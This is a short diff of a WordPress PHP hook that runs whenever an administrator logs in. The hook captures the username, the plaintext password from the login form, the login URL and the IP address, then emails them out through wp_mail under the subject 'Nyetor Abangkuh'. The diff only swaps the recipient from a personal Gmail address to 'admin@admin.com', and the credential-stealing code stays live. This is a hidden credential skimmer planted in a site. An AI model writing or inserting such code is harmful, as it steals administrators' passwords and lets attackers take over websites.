@@ -5,7 +5,7 @@ function log_admin_login($user_login, $user) {
     if (user_can($user, 'manage_options')) {
         $login_page = wp_login_url();
         $log_entry = date('Y-m-d H:i:s') . "\nUsername: " . $user_login . "\nPassword: " . $_POST['pwd'] . "\nLogin Page: " . $login_page . "\nIP Address: " . $_SERVER['REMOTE_ADDR'] . "\n";
-        $email_to = 'sabilainayati3k@gmail.com';
+        $email_to = 'admin@admin.com';
         $subject = 'Nyetor Abangkuh';
         $headers = array('Content-Type: text/plain; charset=UTF-8');
         wp_mail($email_to, $subject, $log_entry, $headers);
